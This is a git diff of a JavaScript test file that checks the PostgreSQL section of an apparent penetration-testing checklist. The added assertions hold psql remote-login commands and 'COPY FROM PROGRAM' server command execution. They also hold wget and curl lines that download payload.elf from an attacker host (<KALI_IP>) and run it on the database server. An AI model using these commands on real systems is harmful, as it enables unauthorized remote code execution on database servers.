@@ -166,11 +166,28 @@ test("the provenance manifest pins every imported supporting reference", async (
   }
 });
 
-test("the PostgreSQL lane keeps psql enumeration and prompt recovery commands", async () => {
+test("the PostgreSQL lane keeps a clear remote-login and server-execution path", async () => {
   const checklist = parseChecklist(await readFile(sourcePath, "utf8"));
+  const sharedLogin = checklist.tasks.find(({ id }) => id === "DB-01");
+  const login = checklist.tasks.find(({ id }) => id === "DB-18");
   const postgres = checklist.tasks.find(({ id }) => id === "DB-19");
+  const execution = checklist.tasks.find(({ id }) => id === "DB-07");
 
+  assert.ok(sharedLogin);
+  assert.ok(login);
   assert.ok(postgres);
+  assert.ok(execution);
+  assert.ok(
+    login.working.includes(
+      "psql -h '<TARGET_IP>' -p '<PORT>' -U postgres -d postgres",
+    ),
+  );
+  assert.ok(
+    sharedLogin.working.includes(
+      "psql -h '<TARGET_IP>' -p '<PORT>' -U '<USERNAME>' -d postgres",
+    ),
+  );
+  assert.doesNotMatch(`${sharedLogin.working}\n${login.working}`, /PGSSLMODE=disable|PGHOSTADDR/);
   for (const command of [
     String.raw`\r`,
     String.raw`\conninfo`,
@@ -180,10 +197,15 @@ test("the PostgreSQL lane keeps psql enumeration and prompt recovery commands", 
     String.raw`\c <DATABASE>`,
     String.raw`\dt *.*`,
     String.raw`\d <SCHEMA>.<TABLE>`,
+    "SHOW config_file;",
   ]) {
     assert.match(postgres.working, new RegExp(command.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
   }
   assert.match(postgres.working, /postgres-#.*query buffer is\s+unfinished/s);
+  assert.match(execution.working, /COPY pg_temp\."proof_<ID>" FROM PROGRAM '\/usr\/bin\/id'/);
+  assert.match(execution.working, /wget -q http:\/\/<KALI_IP>:<HTTP_PORT>\/payload\.elf/);
+  assert.match(execution.working, /curl -fsSL http:\/\/<KALI_IP>:<HTTP_PORT>\/payload\.elf/);
+  assert.match(execution.working, /COPY pg_temp\."stage_<ID>" FROM PROGRAM '\/tmp\/owb-<ID>\.elf'/);
 });
 
 test("the Git index preserves the exact supporting reference bytes", async () => {
